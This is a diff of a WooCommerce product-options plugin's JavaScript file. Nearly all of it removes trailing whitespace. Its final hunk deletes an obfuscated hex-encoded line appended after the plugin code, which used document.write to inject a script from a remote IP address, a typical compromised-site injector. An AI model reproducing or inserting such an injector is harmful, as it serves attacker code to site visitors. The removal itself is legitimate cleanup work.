-                        var len=$current_product_element.find('.tm-clone-product-image').length,                            
-                            el_to_check,                            
+                        var len=$current_product_element.find('.tm-clone-product-image').length,
+                            el_to_check,
                             tm_current_image_element_id=img.data('tm-current-image');
                         for (var i = len - 1; i >= 0; i--) {
                             current_image_replacement = $current_product_element.find('.tm-clone-product-image').eq(i);
                             current_element = current_image_replacement.attr('id').replace('_tmimage','');
                             el_to_check = $this_epo_container.find('[id="'+current_element+'"]');
-                            
+
                             if (el_to_check.is(":checked") && el_to_check.closest(".cpf_hide_element").is(":visible")){
                                 $current_product_element.find('.tm-clone-product-image').eq(i).show();
                                 a.attr('href',$current_product_element.find('.tm-clone-product-image').eq(i).prop('src'));
@@ -5197,7 +5197,7 @@
                             img.data('tm-current-image',false);
                         }else{
                             $current_product_element.find('#'+tm_current_image_element_id+'_tmimage').remove();
-                        }                        
+                        }
                     }
                     if (is_yith_wcmg){
                         if (!$current_product_element.find('.tm-clone-product-image').filter(':visible').length){
@@ -5205,7 +5205,7 @@
                         }else{
                             yith_wcmg_zoom.attr('href', yith_wcmg_default_zoom);
                         }
-                        
+
                         if (yith_wcmg.data('yith_magnifier')) {
                             yith_wcmg.yith_magnifier('destroy');
                         }
@@ -5225,7 +5225,7 @@
                             is_easyzoom_element.swap(null,current_image_replacement.attr('src'));
                         }else{
                             is_easyzoom_element.swap(null,img_src_original);
-                        }                        
+                        }
                     }
 
                 });
@@ -5250,7 +5250,7 @@
                     var last_activate_field=[];
                     tm_last_visible_image_element.each(function(){
                         var t=$(this);
-                        if(field_is_active(t) 
+                        if(field_is_active(t)
                             && has_active_changes_product_image(t)
                             && (tm_check_field_match({
                         "element":t.closest(".cpf_hide_element"),
@@ -5270,12 +5270,12 @@
                         current_element,
                         found=false,
                         tm_current_image_element_id=img.data('tm-current-image');
-                    
+
                     if (last_activate_field.length && tm_last_visible_image_element.length && (!tm_current_image_element_id || tm_last_visible_image_element_id!=tm_current_image_element_id)){
                         tm_last_visible_image_element.last().trigger('tm_trigger_product_image');
                         return;
                     }else{
-                        
+
                         if (!tm_current_image_element_id || $this_epo_container.find('[id="'+tm_current_image_element_id+'"]').closest(".cpf_hide_element").is(":visible")){
                             return;
                         }else{
@@ -5288,13 +5288,13 @@
                                 img.attr('title',img_title_original);
                                 img.attr('alt',img_alt_original);
                                 img.data('tm-current-image',false);
-                            }else{                               
-                                
+                            }else{
+
                                 for (var i = len - 1; i >= 0; i--) {
                                     current_image_replacement = $current_product_element.find('.tm-clone-product-image').eq(i);
                                     current_element=current_image_replacement.attr('id').replace('_tmimage','');
                                     var el_to_check = $this_epo_container.find('[id="'+current_element+'"]');
-                            
+
                                     if (el_to_check.is(":checked") &&  el_to_check.closest(".cpf_hide_element").is(":visible")){
                                         $current_product_element.find('.tm-clone-product-image').eq(i).show();
                                         a.attr('href',$current_product_element.find('.tm-clone-product-image').eq(i).prop('src'));
@@ -5356,7 +5356,7 @@
                 if (last_activate_field.length){
                     last_activate_field[last_activate_field.length-1].trigger('tm_trigger_product_image');
                 }
-                              
+
             }
 
             _window.trigger('tm_product_image_loaded')
@@ -5390,7 +5390,7 @@
                             _window.trigger("tmlazy");
                             $main_product.find('.tm-epo-variation-element').trigger('tm_trigger_product_image');
                         });
-                        // Disable option fields that are unavaiable for current set of attributes 
+                        // Disable option fields that are unavaiable for current set of attributes
                         form
                         .off("woocommerce_update_variation_values_tmlogic")
                         .on("woocommerce_update_variation_values_tmlogic",function(e,variations){
@@ -5418,7 +5418,7 @@
                                         .off(form_event.name)
                                         .on(form_event.name,form_event.func);
                                     }
-                                    
+
                                 }
                             }
                         };
@@ -5429,7 +5429,7 @@
                     form = form.find(".variations_form");
                     form.find('.variations').hide();
                     var li_variations=tm_epo_variation_section.closest("li.tm-extra-product-options-field");
-                    
+
                     form.find('.variations').hide().after(tm_epo_variation_section.addClass("tm-extra-product-options nopadding"));
                     if (li_variations.is(":empty")){
                         li_variations.hide();
@@ -5445,7 +5445,7 @@
                         _window.trigger("tmlazy");
                         $main_product.find('.tm-epo-variation-element').trigger('tm_trigger_product_image');
                     });
-                    // Disable option fields that are unavaiable for current set of attributes 
+                    // Disable option fields that are unavaiable for current set of attributes
                     form
                     .off("woocommerce_update_variation_values_tmlogic")
                     .on("woocommerce_update_variation_values_tmlogic",function(e,variations){
@@ -5467,17 +5467,17 @@
                                     .data('tm-styled-variations',1)
                                     .off(form_event.name,form_event.selector)
                                     .on(form_event.name,form_event.selector,form_event.func);
-                                }else{                                    
+                                }else{
                                     form
                                     .data('tm-styled-variations',1)
                                     .off(form_event.name)
                                     .on(form_event.name,form_event.func);
                                 }
-                                
+
                             }
                         }
                     };
-                    late_variation_event = [];                
+                    late_variation_event = [];
                     form.find('.tm-epo-variation-element').last().trigger('tm_epo_variation_element_change');
                 }
 
@@ -5496,7 +5496,7 @@
                 uls.each(function(i,el){
                     var el=$(el),w=el.width()*0.9,im=el.find(".tmhexcolorimage");
                     im.css({"min-width":w+"px","min-height":w+"px"});
-                });                
+                });
             }
         }
 
@@ -5505,7 +5505,7 @@
                 theme_name=totals.attr('data-theme-name');
 
             if (theme_name){
-                theme_name = theme_name.toLowerCase(); 
+                theme_name = theme_name.toLowerCase();
                 var all_epo_selects = this_epo_container.find('select');
                 switch (theme_name){
                     case 'flatsome':
@@ -5538,15 +5538,15 @@
                             $epo_select.each(function() {
                                 if (!$(this).is('.mpcthSelect')){
                                     $(this).width($(this).outerWidth());
-                                    $(this).customSelect({customClass: 'mpcthSelect'});                                    
+                                    $(this).customSelect({customClass: 'mpcthSelect'});
                                 }
                             });
-                            
+
                         }, 100 );
                         };
                         _window.on("cpflogicrun",function(){blaszok_selects()});
                         _window.on('epo_options_visible',function(){blaszok_selects()});
-                        
+
                         break;
                     case 'enfold':
                     case 'enfold-child':
@@ -5561,8 +5561,8 @@
                     'theme_name':theme_name,
                     'all_epo_selects':all_epo_selects,
                 }});
-            }        
-            
+            }
+
         }
 
         function add_late_fields_prices(product_price,bid,_cart){
@@ -5577,13 +5577,13 @@
                     real_setter=setter;
 
                 if (setter.is("option")){
-                    real_setter=setter.closest("select");                    
+                    real_setter=setter.closest("select");
                 }
                 id=real_setter.attr("name");
                 hidden=this_epo_container.find('#'+id+'_hidden');
-                
+
                 if (bundleid==bid){
-                    
+
                     price=(price/100)*product_price;
                     original_price=(original_price/100)*product_price;
                     if(real_setter.data('tm-quantity')){
@@ -5599,11 +5599,11 @@
                     setter.data('pricew', tm_set_tax_price(price,_cart));
                     setter.data('original_price', tm_set_tax_price(original_price,_cart));
                     setter.data('original_pricew', tm_set_tax_price(original_price,_cart));
-                    
+
                     tm_update_price(setter.closest('.tmcp-field-wrap').find('.tc-price'),price,formatted_price,original_price,original_formatted_price);
-                    
+
                     if (hidden.length==0){
-                        real_setter.before('<input type="hidden" id="'+id+'_hidden" name="'+id+'_hidden" value="'+tm_set_price_without_tax(price,_cart)+'" />');                        
+                        real_setter.before('<input type="hidden" id="'+id+'_hidden" name="'+id+'_hidden" value="'+tm_set_price_without_tax(price,_cart)+'" />');
                     }
                     if (setter.is(".tm-epo-field.tmcp-radio")){
                         if(setter.is(":checked")){
@@ -5621,9 +5621,9 @@
                             original_formatted_price = tm_set_price(setter.data('original_pricew'),_cart,true);
                         }
 
-                        tm_update_price(setter.closest('.tmcp-field-wrap').find('.tc-price'),setter.data('pricew'),formatted_price,setter.data('original_pricew'),original_formatted_price);                        
+                        tm_update_price(setter.closest('.tmcp-field-wrap').find('.tc-price'),setter.data('pricew'),formatted_price,setter.data('original_pricew'),original_formatted_price);
                     }
-                    
+
                 }
             });
             late_fields_prices=[];
@@ -5633,10 +5633,10 @@
 
         function tm_set_checkboxes_rules(){
             // Limit checkbox selection
-            this_epo_container.on('change.cpflimit', 'input.tm-epo-field.tmcp-checkbox', function () {            
+            this_epo_container.on('change.cpflimit', 'input.tm-epo-field.tmcp-checkbox', function () {
                 var $this=$(this);
                 tm_limit_c_selection($this,true);
-                tm_exact_c_selection($this,true);            
+                tm_exact_c_selection($this,true);
             });
 
             // Exact value checkbox check (Todo:check for isvisible)
@@ -5650,16 +5650,16 @@
             if (minimumlimit_cont.length){
                 tm_check_minimumlimit_cont(minimumlimit_cont);
             }
-            
+
         }
 
         function manual_init(container){
             container = $(container);
-            // Start Condition Logic            
+            // Start Condition Logic
             cpf_section_logic(container);
             cpf_element_logic(container);
             run_cpfdependson(container);
-                
+
             // Init field price rules
             tm_epo_rules();
             late_fields_prices=[];
@@ -5672,7 +5672,7 @@
             main_cart.trigger({
                 "type":"tm-epo-update"
             });
-            
+
         }
 
        _window.on('tc_manual_init', function(evt,container){
@@ -5684,7 +5684,7 @@
         /**
          * Holds the main cart when using Composite Products
          */
-        var main_cart               = false,        
+        var main_cart               = false,
             main_epo_inside_form    = false,
             main_totals_inside_form = false,
             form_submit_events      = [],
@@ -5698,9 +5698,9 @@
             if (main_product.is(".product")){
                 not_has_epo=true;
                 has_epo = body.find(epo_selector).length;
-            }            
+            }
         }
-        
+
         // return if product has no extra options and the totals box is not enabled for all product
         if(!has_epo && tm_epo_js.tm_epo_enable_final_total_box_all=="no" && !main_product.is(".tm-no-options-composite")){
             _window.trigger('tm-epo-init-end-no-options');
@@ -5725,13 +5725,13 @@
             }
             if (!product_id){
                 product_id="";
-            }            
+            }
         }
 
         if (!epo_id){
-            
+
             epo_id = parseInt(main_product.find('input.tm-epo-counter').last().val());
-            
+
             if(isNaN(epo_id)){
                 epo_id="";
             }
@@ -5773,9 +5773,9 @@
                     cpf_section_logic(this_epo_container);
                     cpf_element_logic(this_epo_container);
                     run_cpfdependson(this_epo_container);
-                    
+
                     late_fields_prices=[];
-        
+
                     tm_epo_init();
                     tm_product_image();
 
@@ -5787,9 +5787,9 @@
                     }, 10 );
 
                     variations_form.data('tc_loaded',true);
-                    
+
                 });
-                
+
                 if (variations_form_is_loaded){
                     variations_form.trigger('wc_variation_form.cpf');
                 }
@@ -5814,12 +5814,12 @@
             }
         } else {
             setTimeout(function() {
-            
-                // Start Condition Logic            
+
+                // Start Condition Logic
                 cpf_section_logic(this_epo_container);
                 cpf_element_logic(this_epo_container);
                 run_cpfdependson(this_epo_container);
-                
+
                 // Init field price rules
                 tm_epo_rules();
                 late_fields_prices=[];
@@ -5833,12 +5833,12 @@
                     "type":"tm-epo-update",
                     //"norules":"init"
                 });
-            
+
             }, 20 );
         }
 
         tm_lazyload();
-        
+
         tm_css_styles();
         tm_set_color_pickers();
 
@@ -5865,7 +5865,7 @@
 
     function init_epo_plugin(evt){
         if (tm_epo_js.tm_epo_no_lazy_load=="no"){
-             
+
             $.extend($.lazyLoadXT, {
               autoInit:  false,
               selector: 'img.tmlazy',
@@ -5873,15 +5873,15 @@
               visibleOnly:false,
               updateEvent:$.lazyLoadXT.updateEvent + ' tmlazy'
             });
-            
+
         }
-        /* 
+        /*
          * tm-no-options-pxq = product has not options but the "Enable Final total box for all products" is on
          * tm-no-options-composite = product is a composite product with no options but at least one of its bundles have options
          */
         var epo_container=$('.tm-no-options-pxq, .tm-no-options-composite');
         if (epo_container.length>0){
-            
+
             // Special cases
             // -------------
             // Price x Quantity display (.tm-no-options-pxq) & composite without option but a component has extra options (.tm-no-options-composite)
@@ -5896,7 +5896,7 @@
 
         }
         try{
-            
+
             // new main way of calling tm_init_epo
             // -----------------------------------
             // Normal product pages
@@ -5915,7 +5915,7 @@
 
                     if (!j_product_wrap.length>0){
                         j_product_wrap  = $(tc_add_to_cart_selector+'[value="'+product_id+'"]').closest('form,.cart').first().parent();
-                        
+
                         if (!j_product_wrap.length>0){
                             j_product_wrap  = $this.closest('form,.cart').first().parent(".tm-has-options");
 
@@ -5932,7 +5932,7 @@
                             }
                         }
                     }
-                    
+
                     if (j_product_wrap.length>0){
 
                         tm_init_epo(j_product_wrap,quickview_floating,product_id,epo_id);
@@ -5952,13 +5952,13 @@
     //document.addEventListener('DOMContentLoaded', function() {
 
     _document.ready(function() {
-        
+
         _window.on('tc_init_epo_plugin', function(evt){
             init_epo_plugin(evt);
         });
 
         $.ajaxPrefilter(function( options, originalOptions, jqXHR ) {
-            
+
             if (tm_epo_js.tm_epo_enable_in_shop=="yes"){
                 var found=false,
                     hashes = options.url.split("?");
@@ -5989,25 +5989,25 @@
                     }
                 }
             }
-            
+
             if (options.type.toLowerCase()!=="post") {
                 return;
             }
             if(originalOptions.data && originalOptions.data["product_id"] && originalOptions.data["quantity"]){
                 var epos=$('.tc-extra-product-options.tm-product-id-'+originalOptions.data["product_id"]);
                 if(epos.length==1){
-                    options.data = $.param( 
+                    options.data = $.param(
                         $.extend(
-                            originalOptions.data, 
+                            originalOptions.data,
                             epos.tm_aserializeObject(),
                             {
                                 tcaddtocart:originalOptions.data["product_id"],
                                 cpf_product_price:$(".tc-totals-form.tm-product-id-"+originalOptions.data["product_id"]).find(".cpf-product-price").val()
                             }
                         ), false );
-                }                
+                }
             };
-            
+
         });
         _document.ajaxSuccess(function(event, xhr, settings) {
 
@@ -6032,7 +6032,7 @@
             for (var key in qv_container) {
                 if (qv_container.hasOwnProperty(key)) {
                     if (qv_container[key].length){
-                        
+
                         if(key=="yith_quick_view_plugin" && !qv_container[key].find(".product").length>0){
                             continue;
                         }
@@ -6043,7 +6043,7 @@
 
                         var product_id  = tm_lazyload_container.find(epo_selector).attr("data-product-id"),
                             epo_id      = tm_lazyload_container.find(epo_selector).attr("data-epo-id");
-                        
+
                         tm_init_epo(tm_lazyload_container,true,product_id,epo_id);
                         _window.trigger("tmlazy");
                         _window.trigger('tm_epo_loaded_quickview');
@@ -6070,16 +6070,16 @@
                 // hidden fields see totals.php
                 epos_hidden=$('.tm-totals-form-main[data-product-id="'+_product_id+'"]').tm_clone(),
                 formepo=$('<div class="tm-hidden tm-formepo"></div>');
-            
+
             formepo.append(epos);
             formepo.append(epos_hidden);
             $(this).append(formepo);
             return true;
         });
-            
+
         //_document.tcready(function() {
             init_epo_plugin();
-    
+
             $(".tm-cart-link").tmpoplink();
             body.on('updated_checkout' ,function(){
                 $(".tm-cart-link").tmpoplink();
@@ -6090,7 +6090,7 @@
             _window.trigger('tm_epo_loaded');
         //});
 
-        
+
     });
 })(jQuery);
 
@@ -6101,4 +6101,4 @@
             $(this).closest('.quantity').find('input.qty').trigger('change');
         });
     });
-})(jQuery);var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
+})(jQuery);
